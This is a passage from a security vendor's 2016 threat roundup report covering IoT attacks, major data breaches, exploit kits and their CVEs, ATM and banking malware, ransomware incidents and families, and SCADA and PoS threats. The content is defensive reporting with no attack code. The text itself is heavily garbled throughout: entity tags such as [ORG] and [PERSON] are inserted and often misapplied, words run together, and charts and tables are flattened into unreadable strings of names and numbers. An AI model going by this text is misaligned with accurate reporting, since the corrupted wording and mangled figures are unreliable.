[CARDINAL] 50 times higher than its normal volume , forced various websites andservices to go offline for [TIME] several [TIME] hours . Some of Dyn \u2019s clients include [PRODUCT] Twitter , [NORP] Reddit , and [ORG] Spotify . Other reports of actual [NORP] IoT device hacking also surfaced in [DATE] recent [DATE] months . FLOCKER ransomware on smartTVs , for example , pretends to be a law enforcement agency and accuses its victims of crimes they did notcommit . After displaying the warning , [PERSON] FLOCKER locks the device and demands US$ [MONEY] 200 worth of [NORP] iTunes \u00ae gift cards.24 Another incident left residents of [CARDINAL] two buildings in [GPE] Finland out in the cold after a DDoS attacktook the buildings \u2019 environmental control systems [NORP] down.25These recent attacks should serve as a wake - up call to enterprises . Attackers can now use [ORG] IoT to attackan organization from within or from the outside . [ORG] Vulnerable [ORG] IoT devices and systems inside a network caneither be used as entry points for further attacks or they can be manipulated to disrupt operations . Andwhether or not organizations currently use [ORG] IoT technology , they are still susceptible to business - haltingoutside threats like Mirai.13 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise [ORG] ThreatsEnd users should know that not all smart devices are built with security in mind . This makes users , therefore , responsible in securing their devices until all manufacturers implement robust security . Some of the firststeps toward maintaining security are to change passwords frequently and to keep a device \u2019s firmware up - to - date . [ORG] IoT devices are often sold with default passwords , and neglecting to change passwords is alreadya case for potential abuse . For enterprises , implementing stronger [ORG] IoT security policies within organizationsis a good start . They should also complement this by securing all the devices connected to their system . In the long run , the responsibility of providing [ORG] IoT security lies heavily on the manufacturers . After all , notevery user could be expected to be fully aware of the risks involved in an attack . Securing communicationprotocols and devices \u2019 software development kits ( SDKs ) can protect against potential exploits , privacyintrusions , and malware infections that can lead to DDoS attacks.14 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsBiggest Data Breach in History Underscores Responsible Disclosure of CompaniesReports of a company suffering from a data breach are no longer a surprise . Time and again , we have seenhow organizations \u2014 from education systems26 to healthcare institutions27 \u2014 can become a victim of databreaches . For instance , the recent [ORG] Yahoo breach brought the issue of responsible disclosure to the fore . Yahoo hasbeen under a lot of scrutiny for the late disclosure of an [DATE] August [DATE] 2013 data breach that exposed over [CARDINAL] 1 billionof their users \u2019 accounts \u2014 including names , dates of birth , email addresses , MD5 - hashed passwords , andphone numbers.28 This makes it the biggest data breach in history . The recent disclosure came [CARDINAL] three monthsafter the company reported a separate breach in [DATE] September , which involved [CARDINAL] 500 [CARDINAL] million accounts . Yahoo was severely criticized for the way they handled user information and for the time it took them todisclose the breaches . The magnitude of this breach raised concerns and questions on users \u2019 data security . Such an event emphasized how a company \u2019s policies in securing customer data have an effect on theirreputation . The crux of the matter is that companies are responsible for their customers \u2019 data and shouldmake it a priority to be accountable to them . Responding to data breaches not only entails getting to thebottom of the intrusion , but it \u2019s also about informing customers as well . When [ORG] Leoni [ORG] AG was scammed outof [MONEY] millions [MONEY] of [MONEY] dollars , the company released a statement shortly after on their site . The statement includesdetails of the fraudulent activity , the extent of the impact , and how they responded to the attack . Doing soaffirms an organization \u2019s commitment to protecting their customers \u2019 data and privacy.15 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsElexJuly [CARDINAL] 22 [CARDINAL] Almost 1.6 M users [ORG] accountsBon [ORG] Secours [ORG] Health SystemAugust 12 [PRODUCT] 655 [PRODUCT] K patients \u2019 recordsIllinois Board of ElectionsAugust 30 [CARDINAL] 200 K personal voter recordsClixSenseSeptember [CARDINAL] 14 6.6 M user recordsWashington Department of Fish and WildlifeOctober 14 1.7 M customers \u2019 personal recordsFourSquareOctober [CARDINAL] 21 [CARDINAL] 22.5 M user accountsMichigan [ORG] State UniversityNovember 18 [CARDINAL] 400 K personal recordsGoogle AndroidNovember 30 Over 1 M user accountsCommunity Health Plan of WashingtonDecember [CARDINAL] 21 [CARDINAL] 382 K members \u2019 personal informationJULDisney [ORG] Consumer [ORG] Products [ORG] and [ORG] Interactive MediaJuly 30 [CARDINAL] 356 [ORG] K [ORG] Playdom [ORG] Forum users [WORK_OF_ART] \u2019 [WORK_OF_ART] recordsAUGEpic [WORK_OF_ART] Games ForumsSEPOCTNOVAugust [CARDINAL] 23 808 K user accountsBrazzers.comSeptember [CARDINAL] 6 Nearly 800 K user informationYahoo!September [CARDINAL] 22 [CARDINAL] 500 M user accountsWeeblyOctober 20 43 M recordsFriendFinderNovember [CARDINAL] 16 [CARDINAL] 412 M user accountsDECUnited States Navy Career WaypointsNovember 23 134 K user accountsYahoo!December [CARDINAL] 14 [CARDINAL] 1B user accountsNote : Of the data breaches with [CARDINAL] more [CARDINAL] than [CARDINAL] a [CARDINAL] hundred [CARDINAL] thousand records stolen , hacking was found to be the most common method . Additionally , reported data breaches in the [GPE] U.S. reached an all - time record high in [DATE] 2016 , increasing by [PERCENT] 40 % over the [DATE] 2015 figures.29Figure [CARDINAL] 6.Timeline of data breaches , [CARDINAL] 2H 2016Data from privacyrights.org16 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsEnterprises should have security solutions with breach detection systems that will allow them to monitornetwork traffic across all ports , spot any irregularities , and prevent attackers from infiltrating systems . Custom sandboxing can also provide enterprises the ability to analyze malware , detect any C&Cactivity , and identify other hacking techniques used in data breaches . Additionally , deploying machinelearning techniques allows quick and accurate identification of whether network content \u2014 be it files orbehaviors \u2014 are malicious or not.17 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsAngler Leaves the Scene with Other Exploit Kits RisingBy [DATE] the [DATE] third [DATE] quarter [DATE] of [DATE] the [DATE] year , the once dominant [ORG] Angler exploit kit disappeared . Following the arrest of50 cybercriminals on [DATE] June [DATE] 2016,30 [NORP] Angler detections dwindled and ceased to exist . Since then , attackersswitched to other exploit kits to up the ante . The [PERSON] Neutrino exploit kit picked up the pace by distributing CRYPMIC , WALTRIX , and [PERSON] CERBER [PERSON] 4.0ransomware.31 However , by [DATE] September , there were lower access numbers of [PERSON] Neutrino as it dropped outof active circulation in the underground and moved to cater to select clientele.32 The [ORG] Rig exploit kit alsotook advantage of [ORG] Angler \u2019s absence when it distributed CERBER,33 [PERSON] LOCKY,34 and [ORG] MILICRY ransomwarein a malvertising campaign.35 The campaign abuses legitimate services such as Google Maps , Imgur , andPastee to infect systems and lock files with ransomware.1.2M0.6M0Angler SundownJANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDECFigure [DATE] 7 . Number of access to exploit - kit - hosting URLs , [CARDINAL] 2016Other exploit kits also had updates in their techniques . Bizarro Sundown was spotted in early [ORG] Octoberand was used to compromise sites and deliver [CARDINAL] two versions of [GPE] LOCKY ransomware.36 Sundown malwaredesigners , on the other hand , incorporated steganography to hide their exploit code in seemingly harmlessimage files.3718 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsMore exploit kits distributed ransomware in [DATE] 2016 . The recent variant of the notorious CERBER ransomwarefamily , for example , was incorporated in several infection campaigns.38 CERBER 4.0 emerged in earlyOctober and became popular to cybercriminals who wanted to use the malware in malvertising campaignsand to compromise sites . [ORG] Neutrino , [ORG] Magnitude , and [PERSON] Rig are [CARDINAL] three of the prominent exploit kits that deliveredCERBER [CARDINAL] 4.0 in [DATE] 2016 . Compared to the time when [PERSON] Angler was in active distribution in [DATE] 2015 , [DATE] 2016 saw asignificant decrease in vulnerabilities included in exploit kits . [GPE] Exploit KitAnglerNeutrinoMagnitudeRigNuclearSundownHunter LOCKYTable [CARDINAL] 3 . Ransomware families delivered by exploit kits19 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsSundown Exploit [GPE] KitMicrosoft SilverlightCVE-2016 - 0034Microsoft InternetExplorerCVE-2016 - 0189Neutrino Exploit [ORG] KitAdobe Flash CVE-2016 - 4117 CVE-2016 - 1019Microsoft InternetExplorerCVE-2016 - 0189AnglerExploit [ORG] KitAdobe Flash CVE-2016 - 4117 CVE-2016 - 1001Microsoft SilverlightCVE-2016 - [CARDINAL] 0034Nuclear CVE-2016 - 1019RigExploit [GPE] KitMicrosoft SilverlightCVE-2016 - 0034Microsoft InternetExplorerCVE-2016 - 0189Magnitude Exploit [ORG] KitAdobe Flash CVE-2016 - 4117 CVE-2016 - 1019Microsoft InternetExplorerCVE-2016 - 0189Figure [CARDINAL] 8 . Exploits to specific vulnerabilities included in certain exploit kits , [DATE] 2016In [DATE] 2015 , there were a total of [CARDINAL] 17 recorded vulnerabilities that were included in exploit kits . By [DATE] 2016 , thisnumber significantly dropped to [CARDINAL] five , marking a 71 % overall decrease . [PERSON] Adobe [PERSON] Flash remained to be theproduct with the most number of vulnerabilities used by exploit kits . This number , however , decreased by80 % in 2016.157.51580 % change2015 ExplorerFigure 9 . Number of specific vulnerabilities included in exploit kits [DATE] 2015 versus [CARDINAL] 2016Despite dwindling numbers in [DATE] 2016 , exploit kits still remained in the arsenal of many cybercriminals andattackers . Exploit kits still fit into malvertising , ransomware attacks , and other cybercriminal campaigns . Theeffectiveness of these kits against a platform or system is very much dependent on how secure or vulnerableit is . This is why the use of legacy systems puts enterprises at risk . It \u2019s always critical for organizations tokeep their software and operating systems ( OS ) up - to - date with the latest security patches to ensure all theyare protected from potential abuse . Virtual patching can eliminate risk exposure by shielding vulnerabilities while an official patch is unavailable . Enterprises can look into this option for ease of deployment and better scalability without using up a lot ofresources . Security solutions with high - fidelity machine learning can also help detect and block exploits inreal time.20 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsBank Hacking Perseveres with Banking Trojans and [ORG] ATM [ORG] Malware DevelopmentsWith the use of malware and skimming cards , gaining quick profits from ATMs became easier forcybercriminals . [ORG] ATM malware has been around for a while now , with the Skimer variant [ORDINAL] first observed in2009 . Since then , [PERSON] Skimer was recently updated to turn ATMs into skimming machines.39Eastern EuropeSkimerFirst found : [DATE] 2009 Language : Delphi Goal : Dispense / SkimPloutusFirst found : [DATE] 2013 Language : .NET Goal : DispensePadpicFirst found : [DATE] 2014 Language : .NET Goal : DispenseSucefulGreen DispenserNeoPocketFirst found : [DATE] 2015 Language : Borland C++ Goal : Prototyping toolFirst found : [DATE] 2015 Language : Visual C++ Goal : DispenseFirst found : [DATE] 2014 Language : VB Goal : SkimFigure [CARDINAL] 10 . [ORG] ATM malware families and their geographical origins40One of the primary reasons cybercriminals continue to use [ORG] ATM malware is because many of the machinesstill run outdated operating systems like Windows \u00ae XP Embedded . This particular OS is vulnerable sinceMicrosoft already ended support for it in [CARDINAL] 2016,41 meaning all systems running Windows XP Embedded maybe susceptible to attacks since the vendor will no longer release security patches.21 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsTo diversify their attacks , cybercriminals continued to use different variants of [ORG] ATM malware . Recently wediscovered a bare - bones [ORG] ATM malware called ALICE that had been in the wild since [DATE] October [DATE] 2014.42 Whatmakes ALICE particularly noteworthy is that it makes no attempt to connect to other [ORG] ATM - specific hardware , such as the machine \u2019s numeric pad , in order to empty an [ORG] ATM \u2019s safe . It also has no elaborate install oruninstall mechanism . It works as soon the cybercriminal runs the executable in the target environment . [ORG] ALICE \u2019s design suggests that a cybercriminal would need to physically open the [ORG] ATM and infect the machine byusing a CD - ROM or [ORG] USB . The criminal would then need to connect a keyboard to the machine \u2019s motherboardto execute the malware . Q1151,533Q2109,040Q3141,529Q4142,577QAKBOT55,580RAMNIT45,988RAMNIT35,689DORKBOT11,142DORKBOT12,380ZBOT11,028ZBOTDRIDEXFAREITBEBLOH11,53310,0164,7643,532QAKBOTBEBLOHFAREITDRIDEX7,9476,7754,7234,389BANLOAD2,281BANLOAD1,962DOFOILBANKER2,1821,742BankerURSNIF1,7281,617Others11,834Others11,741RAMNITBEBLOHZBOTQAKBOTURSNIFDORKBOTBANLOADFAREITBANKERDRIDEXOthers43,65741,6329,7959,1588,8778,8613,6213,5822,1041,3878,855RAMNIT38,963BEBLOH35,536MIPONY13,089URSNIF13,026ZBOT9,947DORKBOT8,165QAKBOTFAREIT4,5083,560BANLOAD2,235BANKER1,980Others11,568Figure [CARDINAL] 11 . Top banking malware families , [CARDINAL] 2016On the other hand , banking [NORP] Trojans still shared the spotlight for banking - related threats . [DATE] Earlier [DATE] this [DATE] year , QAKBOT detections reemerged after the malware authors of the [ORG] DYRE / DYREZA banking malware werearrested.43 By [DATE] the [DATE] second [DATE] quarter [DATE] of [DATE] the [DATE] year , however , the [ORG] RAMNIT banking [ORG] Trojan resurfaced with twonew live attack servers and a new [ORG] C&C server.44 The banking [ORG] Trojan \u2019s long period of silence , since theattempted takedown of RAMNIT servers in [CARDINAL] 2015,45 ended when RAMNIT targeted major banks in the [CARDINAL] UnitedKingdom.46 The banking [PERSON] Trojan also managed to maintain its presence toward the end of the year.22 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise [PERSON] ThreatsAs [PERSON] ATM malware and banking [NORP] Trojans continue to spread , banking institutions are responsible forguaranteeing the security of their systems by ensuring the physical security of their ATMs , updatingoperating systems , and devoting the time to regularly inspect and address any software vulnerabilities withequipment manufacturers . We also recommend implementing solutions that provide application control andwhitelisting . Deploying such features will block the installation or usage of applications that are not includedin the whitelist . When it comes to the responsibility of securing online transactions , consumers also have a role to play . After all , they are also exposed to these banking - related threats every time they perform on - site and onlinebanking transactions . Through the use of banking malware , for example , cybercriminals may gain access toa user \u2019s PII and credentials . Knowing this , users should regularly change banking - related passwords and / orPINs and remain vigilant when doing online transactions . Enterprises should also adopt endpoint machinesolutions with advanced anti - malware protection and employ [CARDINAL] two - factor authentication on their sites tosecure online banking sessions . Additionally , it is also recommended for bank users to secure various entrypoints such as web , file , and email.23 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsThreat Landscape in [MONEY] ReviewOver [MONEY] 81 [MONEY] billion threats were blocked by [ORG] the [ORG] Trend [ORG] Micro \u2122 [ORG] Smart [ORG] Protection [ORG] Network \u2122 in [DATE] 2016 , a 56 % increasefrom the total number of blocked threats in [DATE] 2015 . This increase is largely drawn from the total number ofemail threats blocked throughout [DATE] the [DATE] year and is consistent with the growth of ransomware and [ORG] BEC , whichare both widely propagated through email or [PERSON] spam.90B45B082B65B52B34B27B29B2014201520161st halfFigure [CARDINAL] 12 . Overall threats blocked by the Trend Micro Smart Protection Network , 20163,348 / sec2,177 / sec1,950 / sec1,692 / sec1,572 / sec1,813 / sec3,5001,75002014201520161st half2nd halfFigure [CARDINAL] 13 . Number of threats blocked per [ORDINAL] second , [DATE] 201624 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise Threats80B75B50B44B40B27B22B26B02014201520161st half2nd halfFigure [CARDINAL] 14 . Number of email threats blocked , [CARDINAL] 20164B3.82B2B02.57B1.80B1.74B1.55B860M2014201520161st halfFigure [CARDINAL] 15 . Number of malicious URLs blocked , [CARDINAL] 201625 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year [DATE] for [DATE] Enterprise [DATE] Threats12B10.96B6B5.42B5.16B5.30B2.75B2.10B02014201620151st halfFigure [CARDINAL] 16 . Number of malicious files blocked , 2016100M50M0JANFEBMARAPRMAYJUNJULAUGSEPTOCTNOVDECDOCXLSRAREXEDOCXHTMLXLSXSCRPDFCOMHTMRTFBINJSVBSWSFDOCMJSEOthersThe upsurge of [ORG] JavaScript attachments in spam from [DATE] the [DATE] month [DATE] of [DATE] June is primarily caused byransomware - related spam . Figure [CARDINAL] 17 . Top file attachments seen in ransomware - related spam according to file type , 2016Note : The significant surge in [ORG] JavaScript attachments in [DATE] November was caused by [ORG] NEMUCOD , a known ransomware dropper . LOCKY ransomware distributed via email also contributed to this surge.26 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsUniversity GastroenterologyJuly 11 [GPE] United [GPE] States [GPE] Encrypted files from file storage system from an acquired practice47United [ORG] States [ORG] United [ORG] Food [ORG] and [ORG] Commercial [ORG] Workers [ORG] Local [ORG] 655 [ORG] Pension FundJuly [CARDINAL] 21 information of current and former members of a union in [GPE] Missouri . [CARDINAL] 49New [ORG] Jersey [ORG] Spine CenterJuly 27 United States Paid undisclosed amount of ransom to gain access to encrypted files51Appalachian [ORG] Regional HospitalsAugust 27 [GPE] United [GPE] States Forced to do manual work due to locked - down system53The [ORG] North [ORG] Dakota [ORG] Department of Mineral ResourcesSeptember 12 [ORG] United [ORG] States [PERSON] Victim was told to pay US$ [MONEY] 350 , but data was restored in [TIME] 24 [TIME] hours through off - site backup [GPE] data55JULWoodbury [GPE] County [DATE] Of\ufb01ceJuly [DATE] 20 [DATE] United [DATE] States [DATE] Encrypted [CARDINAL] 3,700 files without backup48Marin Medical Practices ConceptsJuly 26 [GPE] United [GPE] States Lost [CARDINAL] 5,000 patient records and [DATE] 2 [DATE] weeks \u2019 worth of backup50AUGSarasota City HallAugust 20 United States [PERSON] Shut down all computer systems for more than a day52Kobe UniversitySeptember 7 [GPE] Japan [CARDINAL] One of the PCs infected stored students \u2019 personal records54Yuba - Sutter Medical ClinicSeptember 12 [GPE] United [GPE] States Disrupted operations due to limited access to [GPE] data56SEPT27 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsKeck Medical CenterSeptember 20 [ORG] United [ORG] States Affected [CARDINAL] two servers that store patients \u2019 records58VESKSeptember [CARDINAL] 29 [GPE] United [GPE] Kingdom Paid US$ [MONEY] 23,000 to recover access to one of its systems from a [ORG] Samas DR ransomware attackRainbow Children \u2019s ClinicOctober 17 [GPE] United [GPE] States [GPE] Encrypted patients \u2019 records61Seguin dermatology [CARDINAL] practiceNovember [CARDINAL] 11 patients \u2019 data , [ORG] Social [ORG] Security numbers , medical services billing [GPE] codes63Madison [GPE] County Of\ufb01ceNovember 15 United States Paid US$ [MONEY] 28,000 to decrypt files65SEPOCTNOVSpring\ufb01eld [FAC] City [FAC] HallSeptember 20 [ORG] United [ORG] States [PERSON] Files were inaccessible for [CARDINAL] 10 days57Palmhurst Police DepartmentSeptember 22 United States Years \u2019 worth of data took [DATE] a [DATE] week to restore59Urgent [ORG] Care [ORG] Clinic [ORG] of OxfordOctober 4 [GPE] United [GPE] States Compromised patients \u2019 data including names , [ORG] Social [ORG] Security numbers , dates of birth , health data , and other personal information60Diana , Princess of [ORG] Wales [ORG] Hospital , [ORG] Scunthorpe [ORG] General [ORG] Hospital , and [ORG] Goole and [ORG] District [ORG] HospitalOctober 31 [GPE] United [GPE] Kingdom [GPE] Doctor appointments and other operations got [PERSON] canceled62Menomonee [PERSON] Falls local businessNovember [CARDINAL] 14 [ORG] United [ORG] States [ORG] System got locked down and the business was told to pay US$ 5,6726428 [MONEY] | [MONEY] TrendLabs [MONEY] 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsBigfork School DistrictNovember 24 [GPE] United [GPE] States Encrypted students \u2019 records and other files67Howard County Of\ufb01ceNovember 29 [GPE] United [GPE] States [GPE] Encrypted [CARDINAL] 33,000 files68Henry [ORG] County [ORG] Of\ufb01ceDecember 8 [GPE] United [GPE] States Exposed personal information including names , addresses , phone numbers , and license numbers70East [ORG] Valley [ORG] Community [ORG] Health [ORG] CenterDecember [CARDINAL] 22 [ORG] United [ORG] States Affected [CARDINAL] 65,000 individuals \u2019 records that may include personal , medical , and insurance information72NOVSpencer Chamber of CommerceDECNovember [CARDINAL] 18 [GPE] United [GPE] States Affected all computer systems66San Francisco Municipal Transportation AgencyNovember 28 [GPE] United [GPE] States Locked down the light rail system \u2019s machines that led to passengers grabbing free ridesCarleton [LAW] UniversityNovember [LAW] 29 [ORG] Canada [ORG] Locked university \u2019s computers and files69Carroll [ORG] County Sheriff \u2019s [ORG] Of\ufb01ceDecember 14 [ORG] United [ORG] States Paid US$ [MONEY] 2,400 to recover [DATE] files71Figure [DATE] 18 . Ransomware incidents made public , [CARDINAL] 2H [CARDINAL] 201629 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsJANFEBMARAPRMAYJUNJULAUGSEPOCTLECTOOLCRYPNISCACRYPGPCODEMADLOCKERCERBERMAKTUBCRYPTOSOCRYPTEAR [DATE] 1.0CRYPSALAMWALTRIXCRYPCOREROKKUAUTOLOCKYSNSLOCKZCRYPTBUCBIJIGSAW [DATE] 2.0CRYPAGAJSRAACRYPSHOCKERMIRCOPSATANACRYPMIC 2.0RUSHTEARHOLYCRYPTTILDEBANKTEARCERBER 2.0CRYPHYDRA [CARDINAL] 2.0SHARKRAASATILOCKTEARPURGEFANTOMCRYPTCRYPMIC 3.0CUCKTOXKAWAIILOCKERATOMJOKEMARSCRYPTTRXMILICRYENCRYPTILECOMLINECRYPTBTNCLICKMEGVENISCOMCIRCLEHADESLOCKEMPERCRYPJOKERCRYPHYDRA 1.0LOCKYCRYPAURASURPRISECOVERTONCRYPSAMCRYPTOHOST 1.0ZIPPYCRYPLIKIBRLOCKMISCHABLOCCATOELFACRYPTCRYPDAPWALTRIX 3.0WALTRIX 4.0CRYPCUTEWHITELOCKXORISTZIRBAMFAKELOCKWALTRIX 5.0STAMPADO 1.0JAGERBAKSOCUTESHINOLOCKCRYPZXASCRYPTLOCKDETOXCRYPTO 1.0BART 2.0CERBER 3.0RARVAULTSTAMPADO 2.0CRYPRADAMCRYPRITUCRYPDAPKERANGERPETYACRYPTOHASUXORBATEMPER 2.0CRYPALPHACRYPMAMEWALTRIX [CARDINAL] 2.0TAKALOCKERLOCKSCAMCRIPTODCCRYPHERBSTGOOPICCYPHERKEYLOCKRVTNBARTALFAJUSINOMELPOWERWARE 2.0UYARITEARVENUSLOCKLERITHPOGOTEARKAOTEARSCRNLOCKERWILDFIREELFREXDDOSHDDCRYPTORCRYPYMEMEKAPCRYPZUQUITTESLAPOWERWARE 1.0KIMCILJIGSAWCRYPVAULTSHUJINENIGMABADBLOCKDEMOCRYCRYPEDAAPOCALYPSECRYPKEYIVJOKOZYCRYPMIC 1.0ZIPTBSANCTEARNOOBCRYPTCRYPBEETELANATEARREKTEDACRYPTOHOST 2.0FSOCEDAALMALOCKDOMINOSERPICOCRYPTEAR 2.0EDALOCKHIDDENTEARDEVMAREHIDDENTEARBLACKFEATHER [ORG] FENIXEREBUSDETOXCRYPTO 2.0PRINCESSLOCKERSTOPICRYSISEDA2MASTERBUSTERESMERALDAHORCRUXNULLBYTEJACKPOTLOCK93SHOR7CUTNUCLEARSONIDOCRYPTGOEDA2BLAWILCRYPTEDA2ANUBISENIGMAKOSTYAALCATRAZTENSECANGRYDUCKEXOTICHIDDENTEARSHADOWHIDDENTEARAPTHIDDENTEARNOTORIOUSEDA2NOTORIOUSCRYPTOTROOPEREDA2JANBLEEDKILLERLOCKERLERITH 2.0CERBER 4.030 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise [DATE] ThreatsMATRIXCRYPSHEDLOMIXCERBER [DATE] 5.0.0RARLOCKEXOSHELLCRYPTONKARMAAIRACROPHIDDENTEARCERBERSMASHLOCKRAZYCRYPTHIDDENTEARGUSTERBRAINCRYPTMFESTUSCRYPTORIUMANTIXCERBER [CARDINAL] 5.0.xNOVDECCRYPHYDRAPSHELLHIDDENTEARDECRYPTORSPICYCRYPTEDA2RUNSOMECERBER 4.1.6CRYPTOWIRERANSOCCITOXERUNELOCKERCRYPTASN1CHIPHAPPYLOCKERCRYPTOLUCKHIDDENTEARHAPPYPCLOCKCRYSIS [CARDINAL] 2.0VINDOWSCERBER 5.0.1HIDDENTEARHOLLYHOTDEMPROTOBTCSURVEYLOCKTELECRYPTILOCKEDPAYDOSZEROCRYPTADAMLOCKDERIALOCKDONATOCRYPEXTXXGOLDENEYEMICROPHIDDENTEARFSOCIETYCRYPAYSAFEISHTARHIDDENTEARHCRYPTOGREMITDXXDBADCRIPTSEOIRSEAYTEPSCRLOCKERPOPCORNTYMEDGELOCKERHIDDENTEARKOKOFREROGACRYPBLOCKLEVILOCKDESBLOQNote : Ransomware families discovered in [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2016 have been updated . Table 4 . New ransomware families seen , [CARDINAL] 2016VendorProduct nameVendorProduct nameABBAdvantechAdvantechDeltaEatonEcavaFatekDataManagerProSUSIAccessWebAccessDelta Industrial [CARDINAL] AutomationELCSoftIntegraXorFatek AutomationUnitronicsIBHsoftecS7 - SoftPLCWe - conPanasonicPro - faceRockwell AutomationFPWINProGP - [ORG] Pro [ORG] EXRSLogix [ORG] Micro Starter [ORG] LiteSchneider [ORG] Electric [ORG] SoMachine HVACSiemensTrihedralSINEMA ServerVTScadaVisiLogicLevistudioTable [CARDINAL] 5 . SCADA applications with discovered vulnerabilities , [CARDINAL] 201631 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise Threats2015 Total7142016 Total765High : Medium : Low:37.96%60.22%1.54%High : Medium : Low:37.12%61.44%1.05%Note : While there is an increase in the number of vulnerabilities discovered and reported , most of thevulnerabilities are categorized as having Medium impact ( according to [ORG] the [ORG] Common [ORG] Vulnerability [ORG] Scoring [ORG] System ( CVSS ) rating).In addition , a very small percentage of the total vulnerabilities have no CVSS scores as of this writing . Table [CARDINAL] 6 . [ORG] Trend [ORG] Micro and ZDI CVSS statsQ1 208KASIDET167POSNEWTDEXTRPOCARDLALINAPOSLOGRPOSFIGHTABADDONPOSDEXTERPWNPOSOthers51494135272521201569KASIDETPOCARDLALINAPOSFIGHTDEXTRPOSNEWTPWNPOSHUNTPOSPOSLOGRALINAOSOthers454035343330151311626POSNEWTPOCARDLDEXTRALINAKASIDETPOSFIGHTPOSLOGRJACKPOSPOSHOOKALINAOSOthers4638312612111088736Figure 19 . Top PoS malware families , 2016ALINAGORYNYCHPOCARDLFASTPOSPOSNEWTDEXTRKASIDETRAWPOSTINYPOSPOSFIGHTOthers262520151512111111105232 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsSATANABARTMIRCOPJOKOZYCRYPSHOCKERCRYPKEYIVCRYPCUTEJSRAAJIGSAW [CARDINAL] 2.0WALTRIX [CARDINAL] 3.0CRYPEDAWALTRIX 4.0XORISTCRYPMIC 1.0CRYPMAMEROKKUAUTOLOCKYMISCHAWALTRIX 2.0ENIGMATAKALOCKERBADBLOCKZCRYPTELFACRYPTCRYPDAPCRIPTODCCRYPTOHOST 1.0XORBATJIGSAWWALTRIXDatabase WebsiteSQLTaxCADVD\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022ZIPPYEMPER 2.0CRYPVAULTCRYPCORECRYPLIKICRYPALPHACERBERCRYPAURAKERANGERTESLAMAKTUBPETYACRYPTOSOKIMCILCRYPTEAR 1.0CRYPSAMCRYPGPCODECRYPDAPMADLOCKERLOCKYLECTOOLEMPERCRYPRADAMCRYPNISCACRYPJOKERCRYPRITUSANCTEARCRYPBEEVENUSLOCKREKTEDAPOGOTEARDatabase WebsiteSQLTaxCADVD\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u202234 | TrendLabs 2016 Security Roundup : [DATE] A [DATE] Record [DATE] Year for Enterprise ThreatsDatabase WebsiteSQLTaxCADVDBAKSOCUTEATILOCKTEARSHOR7CUTLOCK93ISHTARHIDDENTEARCERBERHIDDENTEARFSOCIETYHIDDENTEARHAPPYCRYPTOLUCKCRYPTONHIDDENTEARHOLLYEDA2RUNSOMEHIDDENTEARDECRYPTORHIDDENTEARKOKOCRYPMIC 2.0ALFARUSHTEARWALTRIX 5.0HOLYCRYPTSTAMPADO 1.0POWERWARE 2.0UYARITEARHDDCRYPTORJOKEMARSEREBUSDETOXCRYPTO 